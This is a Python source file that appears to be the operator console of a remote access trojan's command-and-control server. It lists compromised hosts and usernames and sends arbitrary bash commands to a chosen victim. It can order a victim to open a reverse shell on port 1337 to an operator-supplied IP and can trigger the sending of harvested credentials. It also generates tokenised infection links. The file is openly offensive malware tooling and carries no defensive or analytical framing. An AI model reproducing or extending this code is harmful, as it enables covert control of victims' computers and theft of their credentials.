import os
import subprocess
import re
import requests
import apext_db


print('example CC interface')
print(''' please type in a command
/list
/use
/create link''')

while 1:
    try:
        MAIN_INPUT = input()
        if MAIN_INPUT == '/list':
            RATLIST = []
            for rat in apext_db.get_rat_list():
                RATLIST.append(rat)
                print(rat)
            i2 = 1
            i = 0
            for rat in RATLIST:
                if i2 == 0:
                    i2 = 0
                    print("({0}) {1} ------ username: {2}".format(i-1, RATLIST[i-1], rat))
                else:
                    i2 +=1
                i+=1
    except Exception as e:
        print(e)
        pass
    
    if MAIN_INPUT == '/use':
        print('What rat ip would you like to use?')
        RAT_IP = input()
        print('What username for the ip would you like to use?')
        RAT_IP_USER = input()
        print(apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[0])
        if apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[0] == RAT_IP and apext_db.check_rat_exists(RAT_IP, RAT_IP_USER)[1] == RAT_IP_USER:
            username = apext_db.check_rat_existss(RAT_IP)[1]
            print(''' Rat {0} exist choose a command 
/command  #runs a bash command 
/rshell   #attempts a reverse shell
/reboot    #attempts to send all creds if havent already'''.format(RAT_IP))
            while 1:
                print('---------Enter command')
                command = input()
                if command == '/command':
                    print('please enter the terminal command, no return code or response will be seen.')
                    TERM_CMD = input()
                    apext_db.user_command(RAT_IP, username, TERM_CMD)

                elif command == '/rshell':
                    print('enter ip you want rat ip to connect to port used will be 1337')
                    master_ip = input()
                    apext_db.rshell_master(RAT_IP, username, master_ip)
                    print('changing masterp ip for this rat')

                elif command == '/help':
                    print('''

/command  #runs a bash command 
/rshell   #attempts a reverse shell
/reboot    #attempts to send all creds if havent already
/script
/help''')

    if MAIN_INPUT.lower() == '/create link':
        n = os.urandom(8).hex()
        f = open('tokens', 'a')
        f.write('{0}\n'.format(n))
        f.close()
        print("Dynamic Token Link created : " + "http://192.168.1.6:3000/inf/{0}".format(n))

                    
        
